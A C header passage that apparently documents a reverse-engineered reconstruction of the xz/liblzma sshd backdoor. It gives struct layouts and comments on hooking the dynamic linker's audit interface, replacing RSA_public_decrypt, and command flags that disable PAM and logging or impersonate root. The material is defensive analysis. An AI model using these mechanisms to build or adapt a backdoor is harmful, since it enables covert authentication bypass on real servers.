	int (*monitor_req_fn)(struct ssh *ssh, int sock, struct sshbuf *m);
	PADDING(0x8);
	PADDING(sizeof(void *));
	void *mm_answer_authpassword_start;
	void *mm_answer_authpassword_end;
	void *monitor_req_authpassword;
	PADDING(sizeof(void *));
	void *mm_answer_keyallowed_start;
	void *mm_answer_keyallowed_end;
	void *monitor_req_keyallowed_ptr;
	PADDING(sizeof(void *));
	void *mm_answer_keyverify_start;
	void *mm_answer_keyverify_end;
	void *monitor_req_keyverify_ptr;
	PADDING(0x4);
	u16 writebuf_size;
	PADDING(0x2);
	u8 *writebuf;
	PADDING(0x8);
	PADDING(0x8);
	PADDING(sizeof(void *));
	void *mm_request_send_start;
	void *mm_request_send_end;
	PADDING(sizeof(u32));
	PADDING(sizeof(u32));
	int *use_pam_ptr;
	int *permit_root_login_ptr;
	char *STR_password;
	char *STR_publickey;
} sshd_ctx_t;

assert_offset(sshd_ctx_t, have_mm_answer_keyallowed, 0x0);
assert_offset(sshd_ctx_t, have_mm_answer_authpassword, 0x4);
assert_offset(sshd_ctx_t, have_mm_answer_keyverify, 0x8);
assert_offset(sshd_ctx_t, monitor_req_fn, 0x10);
assert_offset(sshd_ctx_t, mm_answer_authpassword_start, 0x28);
assert_offset(sshd_ctx_t, mm_answer_authpassword_end, 0x30);
assert_offset(sshd_ctx_t, monitor_req_authpassword, 0x38);
assert_offset(sshd_ctx_t, mm_answer_keyallowed_start, 0x48);
assert_offset(sshd_ctx_t, mm_answer_keyallowed_end, 0x50);
assert_offset(sshd_ctx_t, monitor_req_keyallowed_ptr, 0x58);
assert_offset(sshd_ctx_t, mm_answer_keyverify_start, 0x68);
assert_offset(sshd_ctx_t, mm_answer_keyverify_end, 0x70);
assert_offset(sshd_ctx_t, monitor_req_keyverify_ptr, 0x78);
assert_offset(sshd_ctx_t, writebuf_size, 0x84);
assert_offset(sshd_ctx_t, writebuf, 0x88);
assert_offset(sshd_ctx_t, mm_request_send_start, 0xA8);
assert_offset(sshd_ctx_t, mm_request_send_end, 0xB0);
assert_offset(sshd_ctx_t, use_pam_ptr, 0xC0);
assert_offset(sshd_ctx_t, permit_root_login_ptr, 0xC8);
assert_offset(sshd_ctx_t, STR_password, 0xD0);
assert_offset(sshd_ctx_t, STR_publickey, 0xD8);

typedef struct __attribute__((packed)) sshd_log_ctx {
	PADDING(0x8);
	PADDING(0x8);
	char *STR_percent_s;
	char *STR_Connection_closed_by;
	char *STR_preauth;
	char *STR_authenticating;
	char *STR_user;
	PADDING(0x8);
	PADDING(0x8);
	PADDING(0x8);
	PADDING(0x8);
	void *sshlogv;
} sshd_log_ctx_t;

assert_offset(sshd_log_ctx_t, STR_percent_s, 0x10);
assert_offset(sshd_log_ctx_t, STR_Connection_closed_by, 0x18);
assert_offset(sshd_log_ctx_t, STR_preauth, 0x20);
assert_offset(sshd_log_ctx_t, STR_authenticating, 0x28);
assert_offset(sshd_log_ctx_t, STR_user, 0x30);
assert_offset(sshd_log_ctx_t, sshlogv, 0x58);

typedef struct __attribute__((packed)) global_context {
	BOOL uses_endbr64;
	PADDING(4);
	/**
	 * @brief pointer to the structure containing resolved OpenSSL functions
	 */
	imported_funcs_t *imported_funcs;
	/**
	 * @brief pointer to the structure containing resolved libc functions
	 */
	libc_imports_t* libc_imports;
	/**
	 * @brief 
	 * This flag gets set to TRUE by @ref run_backdoor_commands if any of the validity checks fail,
	 * making future invocations return immediately.
	 *
	 * It's likely both a safety check and an anti tampering mechanism.
	 */
	BOOL disable_backdoor;
	PADDING(4);
	sshd_ctx_t *sshd_ctx;
	struct sensitive_data *sshd_sensitive_data;
	sshd_log_ctx_t *sshd_log_ctx;
	/**
	 * @brief location of sshd .rodata string "ssh-rsa-cert-v01@openssh.com"
	 */
	char *STR_ssh_rsa_cert_v01_openssh_com;
	/**
	 * @brief location of sshd .rodata string "rsa-sha2-256"
	 */
	char *STR_rsa_sha2_256;
	struct monitor **struct_monitor_ptr_address;
	PADDING(0x8);
	/**
	 * @brief sshd code segment start
	 */
	void *sshd_code_start;
	/**
	 * @brief sshd code segment end
	 */
	void *sshd_code_end;
	/**
	 * @brief sshd data segment end
	 */
	void *sshd_data_start;
	/**
	 * @brief sshd data segment start
	 */
	void *sshd_data_end;
	PADDING(0x8);
	/**
	 * @brief liblzma code segment start
	 * 
	 * the shifter will use this address as the minimum search address
	 * any instruction below this address will be rejected
	 */
	void *lzma_code_start;
	/**
	 * @brief liblzma code segment end
	 * 
	 * the shifter will use this address as the maximum search address
	 * any instruction beyond this address will be rejected
	 */
	void *lzma_code_end;
	PADDING(0x78);
	/**
	 * @brief the secret data used for the chacha key generation
	 */
	u8 secret_data[57];
	/**
	 * @brief the shift operation states
	 * 
	 * written by @ref secret_data_append_singleton
	 */
	u8 shift_operations[31];
	/**
	 * @brief number of bits copied
	 */
	u32 num_shifted_bits;
	PADDING(4);
} global_context_t;

assert_offset(global_context_t, uses_endbr64, 0x0);
assert_offset(global_context_t, imported_funcs, 0x8);
assert_offset(global_context_t, libc_imports, 0x10);
assert_offset(global_context_t, disable_backdoor, 0x18);
assert_offset(global_context_t, sshd_ctx, 0x20);
assert_offset(global_context_t, sshd_sensitive_data, 0x28);
assert_offset(global_context_t, sshd_log_ctx, 0x30);
assert_offset(global_context_t, struct_monitor_ptr_address, 0x48);
assert_offset(global_context_t, sshd_code_start, 0x58);
assert_offset(global_context_t, sshd_code_end, 0x60);
assert_offset(global_context_t, sshd_data_start, 0x68);
assert_offset(global_context_t, sshd_data_end, 0x70);
assert_offset(global_context_t, lzma_code_start, 0x80);
assert_offset(global_context_t, lzma_code_end, 0x88);
assert_offset(global_context_t, secret_data, 0x108);
assert_offset(global_context_t, shift_operations, 0x141);
assert_offset(global_context_t, num_shifted_bits, 0x160);
static_assert(sizeof(global_context_t) == 0x168);

typedef struct __attribute__((packed)) backdoor_shared_globals {
	PADDING(sizeof(void*));
	/**
	 * this value is copied to ldso_ctx_t::hook_EVP_PKEY_set1_RSA in backdoor_setup
	 * 
	 */
	PADDING(sizeof(void*));
	global_context_t **globals;
} backdoor_shared_globals_t;

assert_offset(backdoor_shared_globals_t, globals, 0x10);
static_assert(sizeof(backdoor_shared_globals_t) == 0x18);

typedef struct __attribute__((packed)) ldso_ctx {
	PADDING(0x40);
	/**
	 * @brief the location of libcrypto's auditstate::bindflags field
	 * 
	 * _dl_audit_symbind_alt() will check this field to see backdoor_symbind() should be called for this ELF
	 * 
	 * this field is set to LA_FLG_BINDTO to activate backdoor_symbind()
	 * 
	 * before _dl_naudit is set to 1 this is actually the location of libname_list::next
	 * 
	 */
	void *libcrypto_auditstate_bindflags_ptr;
	/**
	 * @brief backup of the old value of libcrypto's libname_list::next field
	 * 
	 */
	void *libcrypto_auditstate_bindflags_old_value;
	/**
	 * @brief the location of sshd's auditstate::bindflags field
	 * 
	 * _dl_audit_symbind_alt() will check this field to see backdoor_symbind() should be called for this ELF
	 * 
	 * this field is set to LA_FLG_BINDFROM to activate backdoor_symbind()
	 * 
	 * before _dl_naudit is set to 1 this is actually the location of libname_list::next
	 * 
	 */
	void *sshd_auditstate_bindflags_ptr;
	/**
	 * @brief backup of the old value of sshd's libname_list::next field
	 * 
	 */
	void *sshd_auditstate_bindflags_old_value;
	/**
	 * @brief location of sshd's link_map::l_audit_any_plt flag
	 * 
	 * this flag controls whether ld.so's _dl_audit_symbind_alt() will even check the struct auditstate for sshd
	 * 
	 * this flag is set to 1 to activate backdoor_symbind()
	 * 
	 */
	void* sshd_link_map_l_audit_any_plt_addr;
	/**
	 * @brief bitmask that sets the link_map::l_audit_any_plt flag
	 * 
	 * used with ldso_ctx_t::sshd_link_map_l_audit_any_plt_addr to set the correct bit
	 * 
	 */
	u8 link_map_l_audit_any_plt_bitmask;
	PADDING(0x7);
	/**
	 * @brief location of ld.so's _rtld_global_ro::_dl_audit_ptr field
	 * 
	 * ld.so's _dl_audit_symbind_alt() uses the struct at this location to call the backdor_symbind() callback function
	 * 
	 * this field is set to hooked_audit_ifaces to activate backdoor_symbind()
	 * 
	 */
	struct audit_ifaces **_dl_audit_ptr;
	/**
	 * @brief location of ld.so's _rtld_global_ro::_dl_naudit_ptr field
	 * 
	 * this field controls whether ld.so's _dl_audit_symbind_alt() will expect any struct audit_ifaces
	 * 
	 * this field is set to 1 to activate backdoor_symbind()
	 * 
	 */
	unsigned int *_dl_naudit_ptr;
	/**
	 * @brief the struct audit_ifaces that points to backdoor_symbind()
	 * 
	 * the audit_ifaces::symbind64 field is set to backdoor_symbind()
	 * 
	 * _dl_audit_symbind_alt() will use this struct to check for a audit_ifaces::symbind64 callback function
	 * 
	 */
	struct audit_ifaces hooked_audit_ifaces;
	PADDING(0x30);
	/**
	 * @brief location of libcrypto's link_map::l_name field
	 * 
	 * used by backdoor_setup() to store a pointer to the backdoor_hooks_data_t struct
	 * 
	 */
	char **libcrypto_l_name;
	/**
	 * @brief address of ld.so's _dl_audit_symbind_alt() function
	 * 
	 * this function is called when ld.so is binding all the dynamic linking symbols between ELFs
	 * 
	 */
	void (*_dl_audit_symbind_alt)(struct link_map *l, const ElfW(Sym) *ref, void **value, lookup_t result);
	/**
	 * @brief code size of ld.so's _dl_audit_symbind_alt() function
	 * 
	 */
	size_t _dl_audit_symbind_alt__size;
	/**
	 * @brief pointer to the function that will replace RSA_public_decrypt()
	 * 
	 */
	pfn_RSA_public_decrypt_t hook_RSA_public_decrypt;
	/**
	 * this field is set to a value from backdoor_shared_globals_t
	 * which is different to the other hook_ fields that are coped from backdoor_hooks_ctx_t
	 * 
	 */
	pfn_RSA_public_decrypt_t hook_EVP_PKEY_set1_RSA;
	/**
	 * @brief pointer to the function that will replace RSA_get0_key()
	 * 
	 */
	pfn_RSA_get0_key_t hook_RSA_get0_key;
	imported_funcs_t *imported_funcs;
	u64 hooks_installed;
} ldso_ctx_t;

assert_offset(ldso_ctx_t, libcrypto_auditstate_bindflags_ptr, 0x40);
assert_offset(ldso_ctx_t, libcrypto_auditstate_bindflags_old_value, 0x48);
assert_offset(ldso_ctx_t, sshd_auditstate_bindflags_ptr, 0x50);
assert_offset(ldso_ctx_t, sshd_auditstate_bindflags_old_value, 0x58);
assert_offset(ldso_ctx_t, sshd_link_map_l_audit_any_plt_addr, 0x60);
assert_offset(ldso_ctx_t, link_map_l_audit_any_plt_bitmask, 0x68);
assert_offset(ldso_ctx_t, _dl_audit_ptr, 0x70);
assert_offset(ldso_ctx_t, _dl_naudit_ptr, 0x78);
assert_offset(ldso_ctx_t, hooked_audit_ifaces, 0x80);
static_assert(sizeof(struct audit_ifaces) == 0x48);
assert_offset(ldso_ctx_t, libcrypto_l_name, 0xF8);
assert_offset(ldso_ctx_t, _dl_audit_symbind_alt, 0x100);
assert_offset(ldso_ctx_t, _dl_audit_symbind_alt__size, 0x108);
assert_offset(ldso_ctx_t, hook_RSA_public_decrypt, 0x110);
assert_offset(ldso_ctx_t, hook_EVP_PKEY_set1_RSA, 0x118);
assert_offset(ldso_ctx_t, hook_RSA_get0_key, 0x120);
assert_offset(ldso_ctx_t, imported_funcs, 0x128);
assert_offset(ldso_ctx_t, hooks_installed, 0x130);
static_assert(sizeof(ldso_ctx_t) == 0x138);


typedef struct __attribute__((packed)) backdoor_hooks_data {
	ldso_ctx_t ldso_ctx;
	global_context_t global_ctx;
	imported_funcs_t imported_funcs;
	PADDING(0xE0);
	libc_imports_t libc_imports;
	PADDING(0x70);
} backdoor_hooks_data_t;

assert_offset(backdoor_hooks_data_t, ldso_ctx, 0);
assert_offset(backdoor_hooks_data_t, global_ctx, 0x138);
assert_offset(backdoor_hooks_data_t, imported_funcs, 0x2A0);
assert_offset(backdoor_hooks_data_t, libc_imports, 0x4A8);
static_assert(sizeof(backdoor_hooks_data_t) == 0x588);

typedef struct __attribute__((packed)) backdoor_hooks_ctx {
	PADDING(0x30);
	backdoor_shared_globals_t *shared;
	backdoor_hooks_data_t **hooks_data_addr;
	uintptr_t (*symbind64)(
		Elf64_Sym *sym, unsigned int ndx,
		uptr *refcook, uptr *defcook,
		unsigned int flags, const char *symname);
	pfn_RSA_public_decrypt_t hook_RSA_public_decrypt;
	pfn_RSA_get0_key_t hook_RSA_get0_key;
	/**
	 * @brief set to addess of symbol .Llzma12_mode_map_part_1
	 */
	PADDING(sizeof(void *));
	PADDING(sizeof(void *));
	PADDING(sizeof(void *));
	/**
	 * @brief set to addess of symbol .Lfile_info_decode_0
	 */
	PADDING(sizeof(void *));
	/**
	 * @brief set to addess of symbol .Lbt_skip_func_part_0
	 */
	PADDING(sizeof(void *));
	PADDING(sizeof(void *));
} backdoor_hooks_ctx_t;

assert_offset(backdoor_hooks_ctx_t, shared, 0x30);
assert_offset(backdoor_hooks_ctx_t, hooks_data_addr, 0x38);
assert_offset(backdoor_hooks_ctx_t, symbind64, 0x40);
assert_offset(backdoor_hooks_ctx_t, hook_RSA_public_decrypt, 0x48);
assert_offset(backdoor_hooks_ctx_t, hook_RSA_get0_key, 0x50);
static_assert(sizeof(backdoor_hooks_ctx_t) == 0x88);


typedef struct __attribute__((packed)) backdoor_setup_params {
	PADDING(0x8);
	backdoor_shared_globals_t *shared;
	backdoor_hooks_ctx_t *hook_params;
	PADDING(0x68);
	elf_entry_ctx_t *entry_ctx;
} backdoor_setup_params_t;

assert_offset(backdoor_setup_params_t, shared, 0x8);
assert_offset(backdoor_setup_params_t, hook_params, 0x10);
assert_offset(backdoor_setup_params_t, entry_ctx, 0x80);
static_assert(sizeof(backdoor_setup_params_t) == 0x88);

/**
 * @brief array of ELF handles
 * @see ElfId maps the indices
 */
typedef struct __attribute__((packed)) elf_handles {
	/**
	 * @brief this is for sshd
	 * 
	 */
	elf_info_t *main;
	/**
	 * @brief ELF context for ld.so
	 * 
	 * in early backdoor_setup() this is for the dynamic linker ld.so
	 */
	elf_info_t *dynamic_linker;
	elf_info_t *libc;
	elf_info_t *liblzma;
	elf_info_t *libcrypto;
} elf_handles_t;

assert_offset(elf_handles_t, main, 0x0);
assert_offset(elf_handles_t, dynamic_linker, 0x8);
assert_offset(elf_handles_t, libc, 0x10);
assert_offset(elf_handles_t, liblzma, 0x18);
assert_offset(elf_handles_t, libcrypto, 0x20);

typedef struct __attribute__((packed)) main_elf {
	elf_handles_t *elf_handles;
	Elf64_Ehdr *dynamic_linker_ehdr;
	void **__libc_stack_end;
} main_elf_t;

assert_offset(main_elf_t, elf_handles, 0x0);
assert_offset(main_elf_t, dynamic_linker_ehdr, 0x8);
assert_offset(main_elf_t, __libc_stack_end, 0x10);

typedef struct backdoor_data backdoor_data_t;

/**
 * @brief data passed to functions that access the backdoor data
 */
typedef struct __attribute__((packed)) backdoor_data_handle {
	backdoor_data_t *data;
	elf_handles_t *elf_handles;
} backdoor_data_handle_t;

assert_offset(backdoor_data_handle_t, data, 0x0);
assert_offset(backdoor_data_handle_t, elf_handles, 0x8);

typedef struct __attribute__((packed)) string_item {
	/**
	 * @brief the string that was referenced, in encoded form
	 */
	EncodedStringId string_id;
	PADDING(4);
	/**
	 * @brief the starting address of the function that referenced the string
	 */
	void *func_start;
	/**
	 * @brief the ending address of the function that referenced the string
	 */
	void *func_end;
	/**
	 * @brief location of the instruction that referenced the string
	 */
	void *xref;
} string_item_t;

assert_offset(string_item_t, string_id, 0);
assert_offset(string_item_t, func_start, 0x8);
assert_offset(string_item_t, func_end, 0x10);
assert_offset(string_item_t, xref, 0x18);
static_assert(sizeof(string_item_t) == 0x20);

typedef struct __attribute__((packed)) string_references {
	string_item_t entries[27];
	PADDING(0x8);
} string_references_t;

assert_offset(string_references_t, entries, 0);

/**
 * @brief this structure is used to hold most of the backdoor information.
 * it's used as a local variable in function @ref backdoor_setup
 */
typedef struct __attribute__((packed)) backdoor_data {
	/**
	 * @brief this is for sshd itself
	 * 
	 */
	struct link_map *main_map;
	/**
	 * @brief this is for ld.so
	 * 
	 */
	struct link_map *dynamic_linker_map;
	struct link_map *liblzma_map;
	struct link_map *libcrypto_map;
	struct link_map *libsystemd_map;
	struct link_map *libc_map;

	elf_handles_t elf_handles;

	backdoor_data_handle_t data_handle;

	/** parsed ELF files */
	/**
	 * @brief this is for sshd itself
	 * 
	 */
	elf_info_t main_info;
	/**
	 * @brief ELF context for ld.so
	 * 
	 * in early backdoor_setup() this is for the dynamic linker ld.so
	 */
	elf_info_t dynamic_linker_info;
	/**
	 * @brief ELF context for libc.so
	 */
	elf_info_t libc_info;
	elf_info_t liblzma_info;
	/**
	 * @brief ELF context for libcrypto.so
	 */
	elf_info_t libcrypto_info;

	/**
	 * @brief functions imported from libc
	 */
	libc_imports_t libc_imports;
	/**
	 * @brief information about resolved string references
	 * and the containing functions boundaries 
	 */
	string_references_t string_refs;
	PADDING(16);
	/**
	 * @brief ELF import resolver (fake LZMA allocator)
	 */
	lzma_allocator *import_resolver;
} backdoor_data_t;

assert_offset(backdoor_data_t, main_map, 0);
assert_offset(backdoor_data_t, dynamic_linker_map, 0x8);
assert_offset(backdoor_data_t, liblzma_map, 0x10);
assert_offset(backdoor_data_t, libcrypto_map, 0x18);
assert_offset(backdoor_data_t, libsystemd_map, 0x20);
assert_offset(backdoor_data_t, libc_map, 0x28);
assert_offset(backdoor_data_t, elf_handles, 0x30);
assert_offset(backdoor_data_t, main_info, 0x68);
assert_offset(backdoor_data_t, dynamic_linker_info, 0x168);
assert_offset(backdoor_data_t, libc_info, 0x268);
assert_offset(backdoor_data_t, liblzma_info, 0x368);
assert_offset(backdoor_data_t, libcrypto_info, 0x468);
assert_offset(backdoor_data_t, libc_imports, 0x568);
assert_offset(backdoor_data_t, string_refs, 0x5D8);
assert_offset(backdoor_data_t, import_resolver, 0x950);
static_assert(sizeof(backdoor_data_t) == 0x958);

typedef struct __attribute__((packed)) backdoor_shared_libraries_data {
	backdoor_data_t *data;
	elf_handles_t *elf_handles;
	/**
	 * @brief address of the PLT for RSA_public_decrypt() in sshd
	 * 
	 */
	void* RSA_public_decrypt_plt;
	/**
	 * @brief address of the PLT for EVP_PKEY_set1_RSA_plt() in sshd
	 * 
	 */
	void* EVP_PKEY_set1_RSA_plt;
	/**
	 * @brief address of the PLT for RSA_get0_key_plt() in sshd
	 * 
	 */
	void* RSA_get0_key_plt;
	backdoor_hooks_data_t **hooks_data_addr;
	libc_imports_t *libc_imports;
} backdoor_shared_libraries_data_t;

assert_offset(backdoor_shared_libraries_data_t, data, 0x0);
assert_offset(backdoor_shared_libraries_data_t, elf_handles, 0x8);
assert_offset(backdoor_shared_libraries_data_t, RSA_public_decrypt_plt, 0x10);
assert_offset(backdoor_shared_libraries_data_t, EVP_PKEY_set1_RSA_plt, 0x18);
assert_offset(backdoor_shared_libraries_data_t, RSA_get0_key_plt, 0x20);
assert_offset(backdoor_shared_libraries_data_t, hooks_data_addr, 0x28);
assert_offset(backdoor_shared_libraries_data_t, libc_imports, 0x30);

/**
 * @brief represents a shift register, which will shift 
 * a '1' into the secret data array.
 * the low 3 bits represent the bit index, while the rest represents the byte index
 * this is convenient, since a simple increment will increment the buffer position correctly
 */
typedef union {
	/** the initial value */
	u32 index;
	struct {
		/** bit index in the current byte indicated by @ref byte_index */
		u32 bit_index : 3;
		/** byte index into the secret data array */
		u32 byte_index : 29;
	};
} secret_data_shift_cursor_t;

/**
 * @brief the payload header. also used as Chacha IV
 * 
 * @return typedef struct 
 */
typedef struct __attribute__((packed)) key_payload_hdr {
	PADDING(0x4);
	PADDING(0x4);
	PADDING(0x8);
} key_payload_hdr_t;

typedef struct __attribute__((packed)) key_payload_body {
	PADDING(0x218);
} key_payload_body_t;

/**
 * @brief the contents of the RSA 'n' field
 * 
 * @return typedef struct 
 */
typedef struct __attribute__((packed)) key_payload {
	key_payload_hdr_t header;
	key_payload_body_t body;
} key_payload_t;

typedef union __attribute__((packed)) {
	u8 value[2];
	u16 size;
} u_cmd_arguments_t;

enum CommandFlags1 {
	/**
	 * @brief the data block contains 8 additional bytes
	 */
	CMDF_8BYTES = 0x1,
	/**
	 * @brief disable all logging by setting mask 0x80000000
	 */
	CMDF_SETLOGMASK = 0x4,
	/**
	 * @brief if set, disables PAM authentication
	 */
	CMDF_DISABLE_PAM = 0x40,
	/**
	 * @brief if set, the union size field must be 0
	 */
	CMDF_NO_EXTENDED_SIZE = 0x80
};

enum CommandFlags2 {
	/**
	 * @brief if set, impersonate a user (info from payload)
	 * if not set, impersonate root
	 */
	CMDF_IMPERSONATE = 0x1,
	/**
	 * @brief if set, changes the `monitor_reqtype` field
	 * from `MONITOR_REQ_AUTHPASSWORD` to what's contained in the payload
	 */
	CMDF_CHANGE_MONITOR_REQ = 0x2,
	/**
	 * @brief 
	 */
	CMDF_AUTH_BYPASS = 0x4,
	/**
	 * @brief more data available in the following packet
	 * not compatible with command 3
	 */
	CMDF_CONTINUATION = 0x40,
	/**
	 * @brief executes pselect, then exit
	 * not compatible with command 2
	 */
	CMDF_PSELECT = 0xC0
};

enum CommandFlags3 {
	/**
	 * @brief 5 bits used to store number of sockets (in cmd3)
	 */
	CMDF_SOCKET_NUM = 0x1F,
	/**
	 * @brief 6 bits used to store the monitor req / 2 (might be unused)
	 */
	CMDF_MONITOR_REQ_VAL = 0x3F
};

typedef struct __attribute__((packed)) cmd_arguments {
	u8 flags1;
	u8 flags2;
	u8 flags3;
	u_cmd_arguments_t u;
} cmd_arguments_t;

assert_offset(cmd_arguments_t, flags1, 0);
assert_offset(cmd_arguments_t, flags2, 1);
assert_offset(cmd_arguments_t, flags3, 2);
assert_offset(cmd_arguments_t, u, 3);
static_assert(sizeof(cmd_arguments_t) == 0x5);

typedef struct __attribute__((packed)) key_ctx {
	BIGNUM *rsa_n;
	BIGNUM *rsa_e;
	cmd_arguments_t args;
	key_payload_t payload;
	PADDING(0x30);
	PADDING(sizeof(key_payload_hdr_t));
	/**
	 * @brief ChaCha Key
	 */
	u8 decrypted_secret_data[57];
	PADDING(2);
} key_ctx_t;

assert_offset(key_ctx_t, rsa_n, 0);
assert_offset(key_ctx_t, rsa_e, 0x8);
assert_offset(key_ctx_t, args, 0x10);
assert_offset(key_ctx_t, payload, 0x15);
static_assert(sizeof(key_ctx_t) == 0x2B8);

typedef struct __attribute__((packed)) backdoor_cpuid_reloc_consts {
	/**
	 * @brief offset from the symbol cpuid_random_symbol to the GOT
	 * 
	 * the field maps to a relocation entry of type R_X86_64_GOTOFF64 and value cpuid_random_symbol
	 */
	ptrdiff_t cpuid_random_symbol_got_offset;
	/**
	 * @brief index in the GOT for _cpuid()
	 * 
	 * the field maps to a relocation entry of type R_X86_64_GOT64 and value _cpuid
	 */
	u64 cpuid_got_index;
	/**
	 * @brief offset from the symbol backdoor_init_stage2() to the GOT
	 * 
	 * the field maps to a relocation entry of type R_X86_64_GOTOFF64 and value backdoor_init_stage2
	 */
	ptrdiff_t backdoor_init_stage2_got_offset;
} backdoor_cpuid_reloc_consts_t;

assert_offset(backdoor_cpuid_reloc_consts_t, cpuid_random_symbol_got_offset, 0);
assert_offset(backdoor_cpuid_reloc_consts_t, cpuid_got_index, 0x8);
assert_offset(backdoor_cpuid_reloc_consts_t, backdoor_init_stage2_got_offset, 0x10);
static_assert(sizeof(backdoor_cpuid_reloc_consts_t) == 0x18);

typedef struct __attribute__((packed)) backdoor_tls_get_addr_reloc_consts {
	/**
	 * @brief offset from the symbol __tls_get_addr() to the PLT
	 * 
	 * the field maps to a relocation entry of type R_X86_64_PLTOFF64 and value __tls_get_addr
	 */
	ptrdiff_t tls_get_addr_plt_offset;
	/**
	 * @brief offset from the symbol tls_get_addr_random_symbol to the GOT
	 * 
	 * the field maps to a relocation entry of type R_X86_64_GOTOFF64 and value tls_get_addr_random_symbol
	 */
	ptrdiff_t tls_get_addr_random_symbol_got_offset;
} backdoor_tls_get_addr_reloc_consts_t;

assert_offset(backdoor_tls_get_addr_reloc_consts_t, tls_get_addr_plt_offset, 0);
assert_offset(backdoor_tls_get_addr_reloc_consts_t, tls_get_addr_random_symbol_got_offset, 0x8);
static_assert(sizeof(backdoor_tls_get_addr_reloc_consts_t) == 0x10);

typedef struct __attribute__((packed)) elf_functions {
	PADDING(sizeof(u64));
	/**
	 * @brief the address of init_hook_functions()
	 * 
	 * the field maps to a relocation entry of type R_X86_64_64 and value init_hook_functions
	 */
	int (*init_hook_functions)(backdoor_hooks_ctx_t *funcs);
	PADDING(sizeof(u64));
	PADDING(sizeof(u64));
	/**
	 * @brief the address of elf_symbol_get_addr()
	 * 
	 * the field maps to a relocation entry of type R_X86_64_64 and value elf_symbol_get_addr
	 */
	void *(*elf_symbol_get_addr)(elf_info_t *elf_info, EncodedStringId encoded_string_id);
	PADDING(sizeof(u64));
	/**
	 * @brief the address of elf_parse()
	 * 
	 * the field maps to a relocation entry of type R_X86_64_64 and value elf_parse
	 */
	BOOL (*elf_parse)(Elf64_Ehdr *ehdr, elf_info_t *elf_info);
} elf_functions_t;

assert_offset(elf_functions_t, init_hook_functions, 0x8);
assert_offset(elf_functions_t, elf_symbol_get_addr, 0x20);
assert_offset(elf_functions_t, elf_parse, 0x30);
static_assert(sizeof(elf_functions_t) == 0x38);

typedef struct __attribute__((packed)) fake_lzma_allocator {
	PADDING(sizeof(u64));
	lzma_allocator allocator;
} fake_lzma_allocator_t;

assert_offset(fake_lzma_allocator_t, allocator.alloc, 0x8);
assert_offset(fake_lzma_allocator_t, allocator.free, 0x10);
assert_offset(fake_lzma_allocator_t, allocator.opaque, 0x18);
static_assert(sizeof(fake_lzma_allocator_t) == 0x20);

typedef struct __attribute__((packed)) instruction_search_ctx
{
	/**
	 * @brief start of the code address range to search
	 * 
	 */
	u8 *start_addr;
	/**
	 * @brief start of the code address range to search
	 * 
	 */
	u8 *end_addr;
	/**
	 * @brief offset to match in the instruction displacement
	 * 
	 */
	u8 *offset_to_match;
	/**
	 * @brief register to match as the instruction output
	 * 
	 */
	u32 *output_register_to_match;
	u8 *output_register; // TODO unknown
	/**
	 * @brief TRUE if the instruction sequence was found, FALSE otherwise
	 * 
	 */
	BOOL result;
	PADDING(0x4);
	backdoor_hooks_data_t *hooks;
	imported_funcs_t *imported_funcs;
} instruction_search_ctx_t;

assert_offset(instruction_search_ctx_t, start_addr, 0);
assert_offset(instruction_search_ctx_t, end_addr, 0x8);
assert_offset(instruction_search_ctx_t, offset_to_match, 0x10);
assert_offset(instruction_search_ctx_t, output_register_to_match, 0x18);
assert_offset(instruction_search_ctx_t, output_register, 0x20);
assert_offset(instruction_search_ctx_t, result, 0x28);
assert_offset(instruction_search_ctx_t, hooks, 0x30);
assert_offset(instruction_search_ctx_t, imported_funcs, 0x38);
static_assert(sizeof(instruction_search_ctx_t) == 0x40);

typedef struct __attribute__((packed)) auth_bypass_args {
	u32 cmd_type;
	PADDING(4);
	cmd_arguments_t *args;
	const BIGNUM *rsa_n;
	const BIGNUM *rsa_e;
	u8 *payload_body;
	u16 payload_body_size;
	PADDING(6);
	RSA *rsa;
} auth_bypass_args_t;

assert_offset(auth_bypass_args_t, cmd_type, 0);
assert_offset(auth_bypass_args_t, args, 0x8);
assert_offset(auth_bypass_args_t, rsa_n, 0x10);
assert_offset(auth_bypass_args_t, rsa_e, 0x18);
assert_offset(auth_bypass_args_t, payload_body, 0x20);
assert_offset(auth_bypass_args_t, payload_body_size, 0x28);
assert_offset(auth_bypass_args_t, rsa, 0x30);

/**
 * @brief 
 * 
 * @param args 
 * @param ctx 
 * @return BOOL 
 */
extern BOOL sshd_auth_bypass(auth_bypass_args_t *args, global_context_t *ctx);

/**
 * @brief disassembles the given x64 code
 *
 * @param ctx empty disassembler context to hold the state
 * @param code_start pointer to the start of buffer (first disassemblable location)
 * @param code_end pointer to the end of the buffer
 * @return BOOL TRUE if disassembly was successful, FALSE otherwise
 */
extern BOOL x86_dasm(dasm_ctx_t *ctx, u8 *code_start, u8 *code_end);

/**
 * @brief finds a call instruction
 *
 * @param code_start address to start searching from
 * @param code_end address to stop searching at
 * @param call_target optional call target address. pass 0 to find any call
 * @param dctx empty disassembler context to hold the state
 * @return BOOL TRUE if found, FALSE otherwise
 */
extern BOOL find_call_instruction(u8 *code_start, u8 *code_end, u8 *call_target, dasm_ctx_t *dctx);

/**
 * @brief finds a lea instruction
 * 
 * @param code_start address to start searching from
 * @param code_end address to stop searching at
 * @param displacement the memory displacement operand of the target lea instruction
 * @return BOOL TRUE if found, FALSE otherwise
 */
extern BOOL find_lea_instruction(u8 *code_start, u8 *code_end, u64 displacement);

/**
 * @brief finds a LEA or MOV instruction with an immediate memory operand
 * 
 * @param code_start address to start searching from
 * @param code_end address to stop searching at
 * @param dctx disassembler context to hold the state
 * @param mem_address the address of the memory fetch (where the instruction will fetch from)
 * @return BOOL TRUE if an instruction was found, FALSE otherwise
 */
extern BOOL find_instruction_with_mem_operand(
	u8 *code_start,
	u8 *code_end,
	dasm_ctx_t *dctx,
	void *mem_address
);

/**
 * @brief finds a LEA instruction with an immediate memory operand
 * 
 * @param code_start address to start searching from
 * @param code_end address to stop searching at
 * @param dctx disassembler context to hold the state
 * @param mem_address the expected address of the memory access
 * @return BOOL TRUE if found, FALSE otherwise
 */
extern BOOL find_lea_instruction_with_mem_operand(
	u8 *code_start,
	u8 *code_end,
	dasm_ctx_t *dctx,
	void *mem_address
);

/**
 * @brief like @ref find_mov_instruction, but also considers LEA instructions
 * 
 * @param code_start address to start searching from
 * @param code_end address to stop searching at
 * @param is_64bit_operand TRUE if MOV should have a 64bit operand, FALSE otherwise
 * @param load_flag TRUE if searching for load, FALSE for a store
 * @param dctx disassembler context to hold the state 
 * @return BOOL TRUE if found, FALSE otherwise
 */
extern BOOL find_mov_lea_instruction(
	u8 *code_start,
	u8 *code_end,
	BOOL is_64bit_operand,
	BOOL load_flag,
	dasm_ctx_t *dctx
);

/**
